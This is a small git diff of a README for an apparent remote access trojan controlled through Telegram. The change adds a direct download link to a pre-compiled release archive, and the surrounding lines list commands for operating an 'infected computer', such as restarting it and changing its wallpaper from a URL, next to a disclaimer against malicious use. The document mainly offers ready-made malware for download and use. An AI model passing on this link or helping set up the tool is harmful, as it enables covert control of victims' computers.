@@ -14,7 +14,7 @@ This software's main purpose is NOT to be used maliciously, or on any system tha
 By using this software, you automatically agree to the above.
 
 ## **Downloads:**
-Pre-Compiled: 
+Pre-Compiled: https://github.com/xssis57/Telegram-Rat/releases/download/Tele/Release.zip
 
 **Requirements:**\
 Windows(x64)
@@ -39,4 +39,5 @@ Available commands are :
 --> /restart = restart computer
 --> /wallpaper = Change infected computer wallpaper / Syntax = "/wallpaper" (url)
 --> !help = This help menu
+
 ```
